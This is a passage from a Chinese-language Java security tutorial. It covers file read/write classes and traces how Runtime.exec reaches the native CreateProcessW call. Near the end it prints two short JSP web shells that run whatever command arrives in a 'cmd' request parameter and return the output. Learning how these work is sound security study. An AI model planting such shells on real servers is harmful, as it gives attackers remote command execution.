ret = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jlong_to_jint(ret);</span><br><span class="line">    &#125;</span><br><span class="line">    JNU_ThrowIOExceptionWithLastError(env, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="FileOutputStream文件写入"><a href="#FileOutputStream文件写入" class="headerlink" title="FileOutputStream文件写入"></a>FileOutputStream文件写入</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFileOutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;Hello Y5neKO!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过getBytes方法获得字节数组，向文件输出流中写入</span></span><br><span class="line">        fos.write(content.getBytes());</span><br><span class="line">        <span class="comment">//flush方法是为了清空缓冲区</span></span><br><span class="line">        fos.flush();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709145014002.png" alt="image-20230709145014002" style="zoom:80%;" />

<p>flush方法是字节输出流的抽象父类OutputStream的方法，所以每个字节输出流类都会有flush方法。但是有些没有缓冲区的类flush方法只是被重写了，但什么都不做，也就是方法体是为空的。所以FileOutputStream调用flush方法什么都没做。另外，close方法也会强制清空缓冲区，因此不写flush也是可以的，但对于不能马上调用close方法的，还是需要用flush方法强制清空一下。毕竟一旦调用close方法，这个流对象也就不能用了。</p>
<img src="/image/image-20230709142911121.png" alt="image-20230709142911121" style="zoom:80%;" />

<h4 id="RandomAccessFile"><a href="#RandomAccessFile" class="headerlink" title="RandomAccessFile"></a>RandomAccessFile</h4><p>Java提供了一个非常有趣的读取文件内容的类: <code>java.io.RandomAccessFile</code>,这个类名字面意思是任意文件内容访问，特别之处是这个类不仅可以像<code>java.io.FileInputStream</code>一样读取文件，而且还可以写文件。</p>
<h5 id="RandomAccessFile读取文件"><a href="#RandomAccessFile读取文件" class="headerlink" title="RandomAccessFile读取文件"></a>RandomAccessFile读取文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRandomAccessFileInput</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建RandomAccessFile对象,r表示以只读模式打开文件，一共有:r(只读)、rw(读写)、</span></span><br><span class="line">            <span class="comment">// rws(读写内容同步)、rwd(读写内容或元数据同步)四种模式。</span></span><br><span class="line">            <span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义每次输入流读取到的字节数对象</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义缓冲区大小</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建二进制输出流对象</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 循环读取文件内容</span></span><br><span class="line">            <span class="keyword">while</span> ((a = raf.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的</span></span><br><span class="line">                <span class="comment">// 下标0开始截取，a表示输入流read到的字节数。</span></span><br><span class="line">                out.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(out);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709145100673.png" alt="image-20230709145100673" style="zoom:80%;" />

<p><code>java.io.RandomAccessFile</code>类中提供了几十个<code>readXXX</code>方法用以读取文件系统，最终都会调用到<code>read0</code>或者<code>readBytes</code>方法，我们只需要掌握如何利用<code>RandomAccessFile</code>读&#x2F;写文件就行了。</p>
<h5 id="RandomAccessFile写文件"><a href="#RandomAccessFile写文件" class="headerlink" title="RandomAccessFile写文件"></a>RandomAccessFile写文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRandomAccessFileOutput</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义待写入文件内容</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;Hello Y5neKO!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建RandomAccessFile对象,rw表示以读写模式打开文件，一共有:r(只读)、rw(读写)、</span></span><br><span class="line">            <span class="comment">// rws(读写内容同步)、rwd(读写内容或元数据同步)四种模式。</span></span><br><span class="line">            <span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(file, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写入内容二进制到文件</span></span><br><span class="line">            raf.write(content.getBytes());</span><br><span class="line">            raf.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="FileSystemProvider"><a href="#FileSystemProvider" class="headerlink" title="FileSystemProvider"></a>FileSystemProvider</h4><p>JDK7新增的NIO.2的<code>java.nio.file.spi.FileSystemProvider</code>,利用<code>FileSystemProvider</code>我们可以利用支持异步的通道(<code>Channel</code>)模式读取文件内容。</p>
<h5 id="FileSystemProvider读取文件"><a href="#FileSystemProvider读取文件" class="headerlink" title="FileSystemProvider读取文件"></a>FileSystemProvider读取文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFileSystemProviderInput</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义读取的文件路径</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Files.readAllBytes(path);</span><br><span class="line">            System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>java.nio.file.Files</code>是JDK7开始提供的一个对文件读写取非常便捷的API，其底层实在是调用了<code>java.nio.file.spi.FileSystemProvider</code>来实现对文件的读写的。最为底层的实现类是<code>sun.nio.ch.FileDispatcherImpl#read0</code>。</p>
<p>基于NIO的文件读取逻辑是：打开FileChannel-&gt;读取Channel内容。</p>
<p>打开FileChannel的调用链为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.nio.ch.FileChannelImpl.&lt;init&gt;(FileChannelImpl.java:<span class="number">89</span>)</span><br><span class="line">sun.nio.ch.FileChannelImpl.open(FileChannelImpl.java:<span class="number">105</span>)</span><br><span class="line">sun.nio.fs.UnixChannelFactory.newFileChannel(UnixChannelFactory.java:<span class="number">137</span>)</span><br><span class="line">sun.nio.fs.UnixChannelFactory.newFileChannel(UnixChannelFactory.java:<span class="number">148</span>)</span><br><span class="line">sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:<span class="number">212</span>)</span><br><span class="line">java.nio.file.Files.newByteChannel(Files.java:<span class="number">361</span>)</span><br><span class="line">java.nio.file.Files.newByteChannel(Files.java:<span class="number">407</span>)</span><br><span class="line">java.nio.file.Files.readAllBytes(Files.java:<span class="number">3152</span>)</span><br><span class="line">com.y5neko.sec.filesystem.FilesDemo.main(FilesDemo.java:<span class="number">23</span>)</span><br></pre></td></tr></table></figure>

<p>文件读取的调用链为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:<span class="number">147</span>)</span><br><span class="line">sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:<span class="number">65</span>)</span><br><span class="line">sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:<span class="number">109</span>)</span><br><span class="line">sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:<span class="number">103</span>)</span><br><span class="line">java.nio.file.Files.read(Files.java:<span class="number">3105</span>)</span><br><span class="line">java.nio.file.Files.readAllBytes(Files.java:<span class="number">3158</span>)</span><br><span class="line">com.y5neko.sec.filesystem.FilesDemo.main(FilesDemo.java:<span class="number">23</span>)</span><br></pre></td></tr></table></figure>

<h5 id="FileSystemProvider写文件"><a href="#FileSystemProvider写文件" class="headerlink" title="FileSystemProvider写文件"></a>FileSystemProvider写文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFileSystemProviderOutput</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义读取的文件路径</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义待写入文件内容</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;Hello Y5neKO!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 写入内容二进制到文件</span></span><br><span class="line">            Files.write(path, content.getBytes());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Java-文件名空字节截断漏洞"><a href="#Java-文件名空字节截断漏洞" class="headerlink" title="Java 文件名空字节截断漏洞"></a>Java 文件名空字节截断漏洞</h3><p>&lt;略&gt;</p>
<h2 id="命令执行流程"><a href="#命令执行流程" class="headerlink" title="命令执行流程"></a>命令执行流程</h2><p>常用的是 <code>java.lang.Runtime#exec()</code>和 <code>java.lang.ProcessBuilder#start()</code>，除此之外，还有更为底层的<code>java.lang.ProcessImpl#start()</code>，他们的调用关系如下图所示：</p>
<img src="/image/640.png" alt="图片" style="zoom: 80%;" />

<p>其中，ProcessImpl类是Process抽象类的具体实现，且该类的构造函数使用private修饰，所以无法在java.lang包外直接调用，只能通过反射调用ProcessImpl#start()方法执行命令。</p>
<img src="/image/640-16668698136972.png" alt="图片" style="zoom:80%;" />

<h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><p>比较通常用的一种命令执行方法，Runtime.getRuntime中的exec方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令，并重定向外部程序的标准输入、标准输出和标准错误到缓冲池。功能和windows“运行”类似</p>
<blockquote>
<p>Runtime.exec不是shell环境，不能直接调用shell命令，需要对不同的操作系统调用不同的命令解释器，Windows的cmd，Linux的&#x2F;bin&#x2F;bash或&#x2F;bin&#x2F;sh等</p>
</blockquote>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Java中，Runtime类提供了许多的API来与<code>java runtime environment</code>进行交互，如：</p>
<ul>
<li>执行一个进程。</li>
<li>调用垃圾回收。</li>
<li>查看总内存和剩余内存。</li>
</ul>
<p>Runtime是单例的，可以通过<code>Runtime.getRuntime()</code>得到这个单例。</p>
<h4 id="API列表"><a href="#API列表" class="headerlink" title="API列表"></a>API列表</h4><p>一些常见的API</p>
<img src="/image/image-20221027172001415.png" alt="image-20221027172001415" style="zoom:80%;" />

<p>这里详细分析exec的调用链</p>
<h4 id="exec调用链"><a href="#exec调用链" class="headerlink" title="exec调用链"></a>exec调用链</h4><p>首先找到接口位置，位于<code>java.lang</code>的<code>Runtime</code>类</p>
<p>首先通过<code>getRuntime</code>方法获取一个Runtime对象</p>
<img src="/image/image-20221027181658266.png" alt="image-20221027181658266" style="zoom:80%;" />

<p><img src="/image/image-20221027181758661.png" alt="image-20221027181758661"></p>
<p>紧接着调用exec方法，可以看到exec一共有六个重载方法</p>
<img src="/image/image-20221027191629449.png" alt="image-20221027191629449" style="zoom:80%;" />

<p>其中完整的参数有三个，command、envp、dir，位置和类型如上，其中command为必须，envp和dir为可选；envp为环境变量，没有envp参数或许为null，那么新发动的进程就承继当时java进程的环境变量；dir为工作目录，没有dir参数或许为null，那么新发动的进程就承继当时java进程的工作目录；我们按顺序来看</p>
<h5 id="java-lang-Runtime-java-347"><a href="#java-lang-Runtime-java-347" class="headerlink" title="java.lang.Runtime.java:347"></a>java.lang.Runtime.java:347</h5><img src="/image/image-20221027192912394.png" alt="image-20221027192912394" style="zoom:80%;" />

<p>第一个重载方法是在只传入一个String类型时执行的方法，此时envp和dir参数为null，官方的注释为：在单独的进程中执行指定的字符串命令。</p>
<h5 id="java-lang-Runtime-java-387"><a href="#java-lang-Runtime-java-387" class="headerlink" title="java.lang.Runtime.java:387"></a>java.lang.Runtime.java:387</h5><img src="/image/image-20221027193726926.png" alt="image-20221027193726926" style="zoom:80%;" />

<p>第二个重载方法只有dir参数为空，官方的注释为：在具有指定环境的单独进程中执行指定的字符串命令。</p>
<h5 id="java-lang-Runtime-java-441"><a href="#java-lang-Runtime-java-441" class="headerlink" title="java.lang.Runtime.java:441"></a>java.lang.Runtime.java:441</h5><img src="/image/image-20221027201257825.png" alt="image-20221027201257825" style="zoom:80%;" />

<p>第三个重载方法三个参数都有，官方的注释为：在具有指定环境和工作目录的单独进程中执行指定的字符串命令。</p>
<p>这个方法用到了<code>StringTokenizer</code>类，作用是根据某些字符做间隔进行分割字符，具体形式后面再具体分析；最后转变为cmdarray数组传入了exec方法</p>
<h5 id="省略"><a href="#省略" class="headerlink" title="省略"></a>省略</h5><p>中间两个重载方法同上，只是command参数变成了直接接受cmdarray数组，中间会调用cmdarray的处理方法，暂时先不看</p>
<h5 id="java-lang-Runtime-java-620"><a href="#java-lang-Runtime-java-620" class="headerlink" title="java.lang.Runtime.java:620"></a>java.lang.Runtime.java:620</h5><p>接下来来到重点最后一个重载方法</p>
<img src="/image/image-20221027205843270.png" alt="image-20221027205843270" style="zoom:80%;" />

<p>上面的方法return到最后一个重载方法，此时准备好调用<code>ProcessBuilder</code>类创建process</p>
<blockquote>
<p>Process类将持有该程序返回 Java VM 的引用。这个procss类是一个抽象类，具体子类的实现依赖于不同的底层操作系统。</p>
</blockquote>
<p>而这个process类型需要通过<code>ProcessBuilder.start()</code>方法进行创建</p>
<h5 id="java-lang-ProcessBuilder-java-1029"><a href="#java-lang-ProcessBuilder-java-1029" class="headerlink" title="java.lang.ProcessBuilder.java:1029"></a>java.lang.ProcessBuilder.java:1029</h5><p>跟进到<code>ProcessBuilder.start()</code>方法，通过上面的步骤对cmdarray数组进行解析，取出cmdarray[0]赋值给prog,如果安全管理器SecurityManager开启,会调用SecurityManager#checkExec()对执行程序prog进行检查，检查通过后调用<code>ProcessImpl</code>类的<code>start</code>方法</p>
<img src="/image/image-20221027210543220.png" alt="image-20221027210543220" style="zoom:80%;" />

<img src="/image/image-20221027184930398.png" alt="image-20221027184930398" style="zoom:80%;" />

<h5 id="java-lang-ProcessImpl-java-87"><a href="#java-lang-ProcessImpl-java-87" class="headerlink" title="java.lang.ProcessImpl.java:87"></a>java.lang.ProcessImpl.java:87</h5><p>跟进到<code>java.lang.ProcessImpl.java</code>，根据官方注释，<code>ProcessImpl</code>类仅用于<code>ProcessBuilder.start()</code>创建新Process</p>
<img src="/image/image-20221027185711455.png" alt="image-20221027185711455" style="zoom:80%;" />

<p>我们继续跟进到<code>ProcessBuilder.start()</code>方法，Windows下会调用<code>ProcessImpl</code>类的构造方法，如果是Linux环境，则会调用<code>java.lang.UNIXProcess#init&lt;&gt;</code></p>
<img src="/image/image-20221027190106915.png" alt="image-20221027190106915" style="zoom:80%;" />

<img src="/image/image-20221027190208801.png" alt="image-20221027190208801" style="zoom:80%;" />

<h5 id="java-lang-ProcessImpl-java-314"><a href="#java-lang-ProcessImpl-java-314" class="headerlink" title="java.lang.ProcessImpl.java:314"></a>java.lang.ProcessImpl.java:314</h5><p>这里以Windows为例，跟进<code>ProcessImpl</code>类构造方法</p>
<img src="/image/image-20221027213622591.png" alt="image-20221027213622591" style="zoom:80%;" />

<p>构造方法内，通过<code>SecurityManager</code>类进行安全校验，通过<code>allowAmbiguousCommands</code>变量作为是否允许调用本地进程的开关，只有当两种检查都通过的时候，则进入<code>Legacy mode(传统模式)</code></p>
<img src="/image/image-20221027214049982.png" alt="image-20221027214049982" style="zoom:80%;" />

<p>传统模式调用<code>needsEscaping</code>，这一步是为了对没有被双引号包裹的空格进行处理，最后通过<code>createCommandLine</code>拼接成字符串</p>
<img src="/image/image-20221027215149974.png" alt="image-20221027215149974" style="zoom:80%;" />

<h5 id="java-lang-ProcessImpl-java-386"><a href="#java-lang-ProcessImpl-java-386" class="headerlink" title="java.lang.ProcessImpl.java:386"></a>java.lang.ProcessImpl.java:386</h5><p>最后通过<code>ProcessImpl.create</code>方法创建进程</p>
<img src="/image/image-20221027215720601.png" alt="image-20221027215720601" style="zoom:80%;" />

<h5 id="ProcessImpl-create"><a href="#ProcessImpl-create" class="headerlink" title="ProcessImpl.create"></a>ProcessImpl.create</h5><p>这是一个Native方法（Java调用非Java代码的接口），根据JNI命名规则，会调用<code>ProcessImpl_md.c</code>中的<code>Java_Java_lang_ProcessImpl_create</code>，我们来看看<code>ProcessImpl_md.c</code>的源码</p>
<blockquote>
<p>ProcessImpl_md.c源码：</p>
<p><a href="http://hg.openjdk.java.net/lambda/lambda/jdk/file/e6aeeec33e53/src/windows/native/java/lang/ProcessImpl_md.c">http://hg.openjdk.java.net/lambda/lambda/jdk/file/e6aeeec33e53/src/windows/native/java/lang/ProcessImpl_md.c</a></p>
</blockquote>
<img src="/image/image-20221027221338125.png" alt="image-20221027221338125" style="zoom:80%;" />

<p>可以看到接受来自java的参数，而在216行，我们可以看到调用了Windows的api函数<code>CreateProcessW()</code>，他的作用是用来创建一个Windows进程</p>
<img src="/image/image-20221027221423618.png" alt="image-20221027221423618" style="zoom:80%;" />

<p>我们来看看Windows官方的定义</p>
<blockquote>
<p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw">https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw</a></p>
</blockquote>
<img src="/image/image-20221027221931223.png" alt="image-20221027221931223" style="zoom: 50%;" />

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>通过观察上面的整个流程，我们可以总结出<code>Runtime.exec</code>的整个调用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传入参数</span></span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//六个重载函数，根据传入不同的数据类型和参数个数进入，最终都处理成‘String[] cmdarray, String[] envp, File dir’的形式，调用最后一个重载函数</span></span><br><span class="line">java.lang.Runtime.java:<span class="number">620</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//调用ProcessBuilder类的start函数</span></span><br><span class="line">java.lang.ProcessBuilder.java:<span class="number">1029</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//根据操作系统类区分，如果是Windows则进入ProcessImpl类的构造方法，如果是Linux则调用java.lang.UNIXProcess#init&lt;&gt;；以Windows为例</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="Windows下调用cmd"><a href="#Windows下调用cmd" class="headerlink" title="Windows下调用cmd"></a>Windows下调用cmd</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] cmd = &#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<h4 id="Linux下调用-bin-bash"><a href="#Linux下调用-bin-bash" class="headerlink" title="Linux下调用&#x2F;bin&#x2F;bash"></a>Linux下调用&#x2F;bin&#x2F;bash</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] cmd = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<h4 id="根据系统选择合适的解释器"><a href="#根据系统选择合适的解释器" class="headerlink" title="根据系统选择合适的解释器"></a>根据系统选择合适的解释器</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="Java本地命令执行"><a href="#Java本地命令执行" class="headerlink" title="Java本地命令执行"></a>Java本地命令执行</h2><p>Java原生提供了对本地系统命令执行的支持，黑客通常会<code>RCE利用漏洞</code>或者<code>WebShell</code>来执行系统终端命令控制服务器的目的。</p>
<p>对于开发者来说执行本地命令来实现某些程序功能(如:ps 进程管理、top内存管理等)是一个正常的需求，而对于黑客来说<code>本地命令执行</code>是一种非常有利的入侵手段。</p>
<h3 id="Runtime命令执行测试"><a href="#Runtime命令执行测试" class="headerlink" title="Runtime命令执行测试"></a>Runtime命令执行测试</h3><h4 id="runtime-exec2-jsp"><a href="#runtime-exec2-jsp" class="headerlink" title="runtime-exec2.jsp"></a>runtime-exec2.jsp</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%=Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>))%&gt;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709170039712.png" alt="image-20230709170039712" style="zoom:80%;" />

<p>这样执行命令没有回显，我们可以通过字节输入流读取回显结果</p>
<h4 id="runtime-exec-jsp"><a href="#runtime-exec-jsp" class="headerlink" title="runtime-exec.jsp"></a>runtime-exec.jsp</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">  <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">  <span class="type">int</span> a;</span><br><span class="line">  <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">while</span> ((a = in.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    baos.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">  &#125;</span><br><span class="line">  out.write(<span class="string">&quot;命令结果：\n&quot;</span> + baos);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709180804827.png" alt="image-20230709180804827" style="zoom:80%;" />

<h5 id="Runtime-exec调用链"><a href="#Runtime-exec调用链" class="headerlink" title="Runtime.exec调用链"></a>Runtime.exec调用链</h5><p><code>Runtime.exec(xxx)</code>调用链如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.jsp.runtime_002dexec_jsp._jspService(runtime_002dexec_jsp:<span class="number">114</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">347</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">450</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">620</span>)</span><br><span class="line">java.lang.ProcessBuilder.start(ProcessBuilder.java:<span class="number">1029</span>)</span><br><span class="line">java.lang.ProcessImpl.start(ProcessImpl.java:<span class="number">134</span>)</span><br><span class="line"><span class="comment">//如果是Linux则继续跟进</span></span><br><span class="line">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:<span class="number">247</span>)</span><br></pre></td></tr></table></figure>

